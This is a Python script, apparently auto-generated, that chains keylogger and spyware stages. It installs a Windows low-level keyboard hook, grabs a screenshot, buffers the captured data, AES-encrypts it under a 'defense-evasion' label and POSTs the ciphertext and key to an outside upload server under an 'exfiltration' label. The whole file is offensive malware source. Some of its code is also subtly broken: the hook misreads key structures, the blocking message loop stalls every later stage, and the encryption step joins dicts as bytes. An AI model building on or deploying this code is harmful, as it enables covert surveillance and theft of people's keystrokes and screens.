#!/usr/bin/env python3
import sys, json, time, requests
from ctypes import windll, CFUNCTYPE, POINTER, c_int, c_void_p, byref
from ctypes.wintypes import MSG, DWORD, BOOL
from typing import Dict, Any
from PIL import ImageGrab
import io
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    result = {'hook_id': None, 'active': False}
    
    try:
        # Define the low-level keyboard hook procedure
        WH_KEYBOARD_LL = 13
        WM_KEYDOWN = 0x0100

        # Define the hook procedure
        def low_level_keyboard_proc(nCode, wParam, lParam):
            if wParam == WM_KEYDOWN:
                # lParam points to a KBDLLHOOKSTRUCT structure
                kb_struct = POINTER(c_void_p).from_address(lParam)
                vk_code = kb_struct.contents.value
                print(f"Key pressed: {vk_code}")
            return windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

        # Create a pointer to the hook procedure
        HOOKPROC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
        hook_proc = HOOKPROC(low_level_keyboard_proc)

        # Set the hook
        hook_id = windll.user32.SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, windll.kernel32.GetModuleHandleW(None), 0)
        if not hook_id:
            raise Exception("Failed to set hook")

        result['hook_id'] = hook_id
        result['active'] = True

        # Message loop to keep the hook active
        msg = MSG()
        while windll.user32.GetMessageA(byref(msg), None, 0, 0) != 0:
            windll.user32.TranslateMessage(byref(msg))
            windll.user32.DispatchMessageA(byref(msg))

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Capture the screenshot
        screenshot = ImageGrab.grab()
        
        # Save the screenshot to a bytes buffer
        buffer = io.BytesIO()
        screenshot.save(buffer, format='PNG')
        image_data = buffer.getvalue()
        
        # Prepare the result
        result = {
            'image_data': image_data.hex(),
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
        }
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial data with fallback values
        return {'success': False, 'data': {'image_data': None, 'timestamp': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract input data
        hook_id = input_data.get('hook_id')
        active = input_data.get('active')
        image_data = bytes.fromhex(input_data.get('image_data', ''))
        timestamp = input_data.get('timestamp', '')

        # Prepare the entries list
        entries = []

        # Add keystroke entry if active
        if active:
            entries.append({
                'type': 'keystroke',
                'hook_id': hook_id,
                'timestamp': timestamp
            })

        # Add screenshot entry
        entries.append({
            'type': 'screenshot',
            'image_data': image_data.hex(),
            'timestamp': timestamp
        })

        # Prepare the result
        result = {
            'entries': entries,
            'count': len(entries)
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial result on failure
        return {'success': False, 'data': {'entries': [], 'count': 0},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Prepare data for encryption
        entries = input_data.get('entries', [])
        count = input_data.get('count', 0)
        
        # Convert entries to a single bytes object
        data_to_encrypt = b''.join(entries)
        
        # Generate key and IV
        key = get_random_bytes(32)  # AES-256
        iv = get_random_bytes(16)   # AES block size
        
        # Encrypt data
        cipher = AES.new(key, AES.MODE_CBC, iv)
        # Padding data to be multiple of block size
        padding_length = AES.block_size - len(data_to_encrypt) % AES.block_size
        padded_data = data_to_encrypt + bytes([padding_length] * padding_length)
        ciphertext = cipher.encrypt(padded_data)
        
        # Prepare result
        result = {
            'ciphertext': ciphertext.hex(),
            'iv': iv.hex(),
            'key': key.hex()
        }
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial result with None values for required fields
        result = {
            'ciphertext': None,
            'iv': None,
            'key': None
        }
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def task_T5(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract and convert input data
        ciphertext = bytes.fromhex(input_data.get('ciphertext', ''))
        iv = bytes.fromhex(input_data.get('iv', ''))
        key = bytes.fromhex(input_data.get('key', ''))

        # Prepare data for transmission
        data_to_send = {
            'ciphertext': ciphertext.hex(),
            'iv': iv.hex(),
            'key': key.hex()
        }

        # Define the remote server URL
        url = "https://remote-server.com/upload"

        # Send data via HTTPS POST request
        response = requests.post(url, json=data_to_send, timeout=10)

        # Check if the request was successful
        if response.status_code == 200:
            result = {'success': True}
        else:
            result = {'success': False}

        return {'success': result['success'], 'data': result,
                'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Hook Keyboard [execution] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Hook Keyboard): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Hook Keyboard): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Capture Screenshots [execution] ──
    try:
        r = task_T2(None)
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Capture Screenshots): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Capture Screenshots): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Buffer Data [data-processing] ──
    try:
        _inp = {}
        _inp.update(outputs.get('T1', {}))
        _inp.update(outputs.get('T2', {}))
        r = task_T3(_inp)
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Buffer Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Buffer Data): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Encrypt Data [defense-evasion] ──
    try:
        r = task_T4(outputs.get('T3', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Encrypt Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Encrypt Data): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    # ── T5: Upload Data [exfiltration] ──
    try:
        r = task_T5(outputs.get('T4', {}))
        results['T5'] = r
        if r.get('success'):
            outputs['T5'] = r.get('data', {})
            print(f'[+] T5 (Upload Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T5 (Upload Data): FAILED — {err}')
            failed.append('T5')
            r2 = task_T5(outputs.get('T4', {}))
            if r2.get('success'):
                outputs['T5'] = r2.get('data', {})
                failed.remove('T5')
    except Exception as e:
        print(f'[!] T5 crashed: {e}')
        failed.append('T5')
        results['T5'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))